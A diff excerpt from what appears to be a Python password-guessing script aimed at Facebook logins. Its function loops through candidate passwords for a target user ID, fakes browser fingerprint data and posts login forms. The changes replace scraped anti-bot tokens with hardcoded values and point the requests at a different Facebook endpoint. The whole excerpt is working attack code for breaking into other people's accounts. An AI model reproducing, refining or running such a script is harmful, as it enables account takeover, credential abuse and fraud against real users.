@@ -1895,7 +1895,7 @@ def d(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             ua = Idinnew()
-            requ = Session.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+            requ = Session.get('https://touch.facebook.com').text
             kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in Session.cookies.get_dict().items() ])}')
             data = {
 				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
@@ -1911,10 +1911,10 @@ def d(uid,pwx,tl):
 				'had_cp_prefilled':'true',
 				'had_password_prefilled':'true',
 				'is_smart_lock':'false',
-				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
+				'bi_xrwh':"92004344361786634",
 				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
 				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
-				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
+				'fb_dtsg':"NAfvEdvHKfq3724xqDNoimlnQyGa74HH6jE8tvRiLUZppVoWnKtWOpw:0:0",
 				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
 				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
 				'__dyn':'',
